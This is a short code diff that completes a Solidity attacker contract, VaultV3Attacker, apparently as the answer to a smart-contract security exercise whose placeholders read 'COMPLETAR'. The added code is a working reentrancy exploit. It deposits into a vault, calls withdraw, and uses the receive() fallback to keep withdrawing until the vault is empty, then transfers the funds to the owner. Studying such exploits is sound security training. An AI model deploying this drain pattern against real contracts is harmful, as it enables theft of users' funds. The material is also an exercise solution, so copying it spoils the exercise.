@@ -17,10 +17,16 @@ contract VaultV3Attacker is Ownable {
     }
 
     function attack() external payable onlyOwner {
-        // COMPLETAR
+        vault.deposit{value: msg.value}();
+        vault.withdraw();
     }
 
     receive() external payable {
-        // COMPLETAR
+        if(address(vault).balance > 0) {
+            vault.withdraw();
+        }else {
+            payable(owner()).transfer(address(this).balance);
+        }
+        
     }
 }
